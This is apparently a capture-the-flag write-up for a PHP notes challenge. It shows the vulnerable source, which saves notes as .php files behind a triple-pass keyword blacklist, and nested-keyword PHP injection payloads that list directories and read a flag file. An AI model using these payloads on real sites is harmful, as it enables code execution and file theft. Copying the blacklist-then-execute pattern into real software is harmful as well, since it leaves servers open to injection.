# Phat Pottomed Girls - Writeup

This challenge gives us a website of note memo that you can create a note as much as you want and it'll store on the website.

The challenge also gives us the backend source code as the following. 

## Source code 
```php
<?php
session_start();

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function filter($originalstring)
{
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}

if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];

    //3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```
## Analysis
From looking at the source code, the input will be sanitized from a group of reserved words for three times. Which means, if there is an input that need to be sanitized for four times, this sanitization wouldn't work. So we'll exploit from here. 

For example : 

`'<<<<????'` will become `'<?'` which bypass the input sanitization process.

It's also given that the flag is in the root directory. Just to make sure, we can use XSS to force the website to tell where the root directory is, and find what could be the flag file in the root diary. Then print the flag file by injecting the php script into the note.

## Solution 

As I said in the analysis part, we will start from checking the root directory. By typing,

```php
<<<<?????=$_SERVER['DOCUMENT_ROOT']???>>>
```

which will be sanitized to 
```php
<?=$_SERVER['DOCUMENT_ROOT']?>
```
which will display the current directory of the website, that is 
```
/var/www/html/
```
To go to root directory `/` we have to go to parent directory 3 times (parent of html and www and var respectively.) Therefore, if there is any a.txt in the root path, we can access them in the following path 
```
../../../a.txt
```
Since I'm not sure about the name and type of the flag file, so I decide to scan in that directory first, by injecting the following input. 
```php
<<<<????php echo '<pre>'; print_r(scandir('../../../')); echo '</pre>';>>>>
```
Note : `scandir($path)` will return the list of the file or directory in `$path`.

So we find the `flag.php` in that directory, then, here is the final input we will use to display the `flag.php` file.

```php
<<<<????php echo htmlentities(firerereadadadle_get_contents('../../../flflflflagagagag.php'));????>>>>
```
and we finally got the flag.

flag : 
```
flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}
```

